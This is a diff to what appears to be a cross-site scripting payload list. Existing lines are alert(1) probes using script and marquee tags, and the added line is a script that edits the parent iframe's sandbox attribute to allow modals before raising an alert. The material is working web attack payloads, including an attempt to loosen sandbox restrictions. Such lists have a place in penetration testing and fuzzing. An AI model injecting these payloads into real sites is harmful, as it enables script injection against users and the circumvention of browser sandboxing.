@@ -38,3 +38,4 @@ alert(1)>//INJECTX
 <script>alert(1)<!--INJECTX
 <marquee loop=1 width=0 onfinish=alert(1)>//INJECTX
 <script>alert('XSS')</script>
+<script>(() => {const f=window.frameElement;if(f){let s=(f.getAttribute('sandbox')||'').split(/\s+/).filter(Boolean);if(!s.includes('allow-modals'))s.push('allow-modals');f.setAttribute('sandbox',s.join(' '));}alert('sandbox setup done');})();</script>
